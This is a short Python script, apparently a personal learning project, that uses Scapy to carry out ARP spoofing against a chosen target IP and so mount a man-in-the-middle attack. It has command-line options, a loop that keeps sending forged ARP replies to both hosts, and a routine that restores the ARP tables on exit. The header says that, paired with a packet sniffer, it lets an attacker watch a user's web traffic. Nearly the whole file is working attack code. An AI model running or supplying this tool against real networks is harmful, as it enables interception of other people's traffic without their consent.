#!/usr/bin/env python
# This program uses ARP spoofing to perform a MitM attack on a given host
# Used in conjunction with a packet scanner (Wireshark) an attacker 
# could watch a given users web traffic
#
# Playing around with Scapy to craft ARP packets
# Usage: arp_spoof.py -t $targetIP -s $spoofedIP
# Brendan Fulcher 2018
# Python 2

import scapy.all as scapy
import optparse
from time import sleep
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Specify IP address as the target.")
    parser.add_option("-s", "--spoof_ip", dest="spoof_ip", help="Specify IP address you want to spoof")
    (options, arguments) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an IP address to target, see --help")
    if not options.spoof_ip:
        parser.error("[-] Please specify an IP address to spoof, see --help")
    
    sent_packets_count = 0
    try:
        while True:
            spoof(options.target_ip, options.spoof_ip)
            spoof(options.spoof_ip, options.target_ip)

            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count) + "\t\t\t CTRL - C to exit."),
            sys.stdout.flush()
            sleep(2)
    except KeyboardInterrupt:
        print("\n\n[+] Detected CTRL + C ..... Resetting ARP tables, Please wait.\n")
        restore(options.target_ip, options.spoof_ip)
        restore(options.spoof_ip, options.target_ip)

if __name__== "__main__":
    main()
